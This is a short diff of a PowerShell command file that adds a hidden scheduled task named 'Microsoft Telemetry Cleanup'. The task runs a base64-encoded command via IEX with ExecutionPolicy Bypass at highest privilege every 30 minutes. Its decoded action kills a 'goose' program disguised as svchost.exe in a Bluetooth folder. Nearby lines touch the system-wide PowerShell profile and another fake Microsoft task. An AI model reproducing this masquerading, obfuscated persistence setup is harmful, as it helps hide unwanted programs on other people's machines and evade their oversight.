@@ -33,4 +33,6 @@ $p='C:\Windows\System32\WindowsPowerShell\v1.0\profile.ps1'; New-Item $p -Force;
 Unregister Scheduled Task
 Unregister-ScheduledTask -TaskName "Microsoft Telemetry Sync" -TaskPath "\Microsoft\Windows\Application Experience\" -Confirm:$false
 
+Scheduled task that kills goose eveyr 30 mins so it doesn't run endlessly if not killed
+Register-ScheduledTask -TaskName "Microsoft Telemetry Cleanup" -TaskPath "\Microsoft\Windows\Application Experience\" -Action (New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-WindowStyle Hidden -ExecutionPolicy Bypass -Command `"IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyRfLlBhdGggLWxpa2UgJypcQmx1ZXRlZXRoXEdvb3NlVGVzdC1tYWluXHN2Y2hvc3QuZXhlJ30gfCBTdG9wLVByb2Nlc3MgLUZvcmNl')))`"") -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 30)) -Principal (New-ScheduledTaskPrincipal -GroupId "Users" -RunLevel Highest) -Settings (New-ScheduledTaskSettingsSet -Hidden) -Force
 
